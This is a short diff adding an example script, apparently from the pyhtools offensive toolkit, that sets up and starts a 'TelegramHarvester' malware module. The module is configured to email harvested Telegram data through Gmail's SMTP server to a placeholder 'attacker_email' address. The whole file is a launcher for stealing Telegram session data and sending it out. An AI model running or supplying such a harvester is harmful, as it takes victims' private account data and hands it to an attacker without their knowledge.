+++ examples/Malwares/TelegramDataHarvester.py
@@ -1,0 +1,12 @@
+from pyhtools.evil_files.malwares.telegram_data_harvester.harvester import TelegramHarvester
+
+
+tdata_harvester = TelegramHarvester(
+    sender_email='dummy_email',  # dummy email to send collected data
+    sender_passwd='dummy_email_passwd', # dummy email account password for authentication
+    server='smtp.gmail.com',  # smtp email server domain
+    port=587,  # smtp server port
+    receivers='attacker_email',  # email where harvested data will sent
+)
+
+tdata_harvester.start()
